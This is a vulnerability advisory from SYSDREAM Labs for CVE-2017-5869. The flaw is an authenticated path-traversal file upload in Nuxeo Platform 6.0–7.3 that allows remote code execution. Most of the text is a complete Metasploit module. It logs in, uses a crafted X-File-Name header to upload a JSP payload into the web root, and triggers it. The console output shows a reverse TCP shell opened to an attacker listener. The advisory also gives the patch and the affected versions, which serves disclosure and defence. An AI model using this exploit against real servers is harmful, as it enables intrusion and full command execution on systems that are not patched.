
Nuxeo Platform is a content management system for enterprises (CMS).
It embeds an Apache Tomcat server, and can be managed through a web
interface.

One of its features allows authenticated users to import files to the
platform.
By crafting the upload request with a specific ``X-File-Name`` header,
one can successfuly upload a file at an arbitrary location of the server
file system.

It is then possible to upload a JSP script to the root directory of the
web application to execute commands on the remote host operating system.
Setting the value ``../../nxserver/nuxeo.war/shell.jsp`` to the
``X-File-Name`` header is a way to do so.

## Details

**CVE ID**: CVE-2017-5869

**Access Vector**: network

**Security Risk**: high

**Vulnerability**: CWE-434

**CVSS Base Score**: 8.8

**CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

# Proof of Concept

Here is a metasploit module to exploit this vulnerability:

```ruby
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::HttpClient

    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;              => "Nuxeo Platform File Upload RCE",
            &#039;Description&#039;       => %q{
                The Nuxeo Platform tool is vulnerable to an
authenticated remote code execution,
                thanks to an upload module.
            },
            &#039;License&#039;           => MSF_LICENSE,
            &#039;Author&#039;            => [&#039;Ronan Kervella
<r.kervella@sysdream.com>&#039;],
            &#039;References&#039;        =>
                [
                    [&#039;https://nuxeo.com/&#039;, &#039;&#039;]
                ],
            &#039;Platform&#039;          => %w{linux},
            &#039;Targets&#039;           => [ [&#039;Nuxeo Platform 6.0 to 7.3&#039;,
&#039;Platform&#039; => &#039;linux&#039;] ],
            &#039;Arch&#039;              => ARCH_JAVA,
            &#039;Privileged&#039;        => true,
            &#039;Payload&#039;           => {},
            &#039;DisclosureDate&#039;    => "",
            &#039;DefaultTarget&#039;     => 0))
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the nuxeo
application&#039;, &#039;/nuxeo&#039;]),
                OptString.new(&#039;USERNAME&#039;, [true, &#039;A valid username&#039;, &#039;&#039;]),
                OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password linked to the
username&#039;, &#039;&#039;])
            ], self.class)
    end

    def jsp_filename
        @jsp_filename ||= Rex::Text::rand_text_alpha(8) + &#039;.jsp&#039;
    end

    def jsp_path
        &#039;nxserver/nuxeo.war/&#039; + jsp_filename
    end

    def nuxeo_login
        res = send_request_cgi(
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;/login.jsp&#039;)
        )

        fail_with(Failure::Unreachable, &#039;No response received from the
target.&#039;) unless res
        session_cookie = res.get_cookies

        res = send_request_cgi(
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => normalize_uri(target_uri.path,
&#039;/nxstartup.faces&#039;),
            &#039;cookie&#039;    => session_cookie,
            &#039;vars_post&#039; => {
                &#039;user_name&#039;     => datastore[&#039;USERNAME&#039;],
                &#039;user_password&#039; => datastore[&#039;PASSWORD&#039;],
                &#039;submit&#039;        => &#039;Connexion&#039;
            }
        )
        return session_cookie if res && res.code == 302 &&
res.redirection.to_s.include?(&#039;view_home.faces&#039;)
        nil
    end

    def trigger_shell
        res = send_request_cgi(
            &#039;method&#039;    => &#039;GET&#039;,
            &#039;uri&#039;       => normalize_uri(target_uri.path, jsp_filename)
        )
        fail_with(Failure::Unknown, &#039;Unable to get
#{full_uri}/#{jsp_filename}&#039;) unless res && res.code == 200
    end

    def exploit
        print_status("Authenticating using
#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
        session_cookie = nuxeo_login
        if session_cookie
            payload_url = normalize_uri(target_uri.path, jsp_filename)
            res = send_request_cgi(
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => normalize_uri(target_uri.path,
&#039;/site/automation/batch/upload&#039;),
                &#039;cookie&#039;    => session_cookie,
                &#039;headers&#039;    => {
                    &#039;X-File-Name&#039;   => &#039;../../&#039; + jsp_path,
                    &#039;X-Batch-Id&#039;    => &#039;00&#039;,
                    &#039;X-File-Size&#039;   => &#039;1024&#039;,
                    &#039;X-File-Type&#039;   => &#039;&#039;,
                    &#039;X-File-Idx&#039;    => &#039;0&#039;,
                    &#039;X-Requested-With&#039;  => &#039;XMLHttpRequest&#039;
                },
                &#039;ctype&#039;             => &#039;&#039;,
                &#039;data&#039; => payload.encoded
            )
            fail_with(Failure::Unknown, &#039;Unable to upload the payload&#039;)
unless res && res.code == 200
            print_status("Executing the payload at
#{normalize_uri(target_uri.path, payload_url)}.")
            trigger_shell
        else
            fail_with(Failure::Unknown, &#039;Unable to login&#039;)
        end
    end

end
```

Module output:

```bash
msf> use exploit/multi/http/nuxeo
msf exploit(nuxeo) > set USERNAME user1
USERNAME => user1
msf exploit(nuxeo) > set PASSWORD password
PASSWORD => password
msf exploit(nuxeo) > set rhost 192.168.253.132
rhost => 192.168.253.132
msf exploit(nuxeo) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf exploit(nuxeo) > set lhost 192.168.253.1
lhost => 192.168.253.1
msf exploit(nuxeo) > exploit

[-] Handler failed to bind to 192.168.253.1:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Authenticating using user1:password
[*] Executing the payload at /nuxeo/nuxeo/QBCefwxQ.jsp.
[*] Command shell session 1 opened (172.17.0.2:4444 ->
192.168.253.132:43279) at 2017-01-13 14:47:25 +0000

id
uid=1000(nuxeo) gid=1000(nuxeo)
groups=1000(nuxeo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
pwd
/var/lib/nuxeo/server
```

# Vulnerable code

The vulnerable code is located in the
`org.nuxeo.ecm.restapi.server.jaxrs.BatchUploadObject` class ([github
link](https://github.com/nuxeo/nuxeo/blob/b05dde789a6c0c7b5f361608eb6d6bd0fda31f36/nuxeo-features/rest-api/nuxeo-rest-api-server/src/main/java/org/nuxeo/ecm/restapi/server/jaxrs/BatchUploadObject.java#L150)),
where the header ``X-File-Name`` is not checked.

# Fix

Nuxeo provided a
[patch](https://github.com/nuxeo/nuxeo/commit/6b3113977ef6c2307f940849a2c196621ebf1892)
for this issue.
A hotfix release is also available for Nuxeo 6.0 (Nuxeo 6.0 HF35).

Please note that vulnerability does not affect Nuxeo versions above 7.3.

# Affected versions

* Nuxeo 6.0 (LTS 2014), released 2014-11-06
* Nuxeo 7.1 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-01-15
* Nuxeo 7.2 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-03-24
* Nuxeo 7.3 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-06-24

# Unaffected versions

* Nuxeo 6.0 HF35, released 2017-01-12
* Nuxeo 7.4 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-10-02
* Nuxeo 7.10 (LTS 2015), released 2015-11-09
* Nuxeo 8.10 (LTS 2016), released 2016-12-06

# Credits

Ronan Kervella <r.kervella@sysdream.com>

-- 
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream

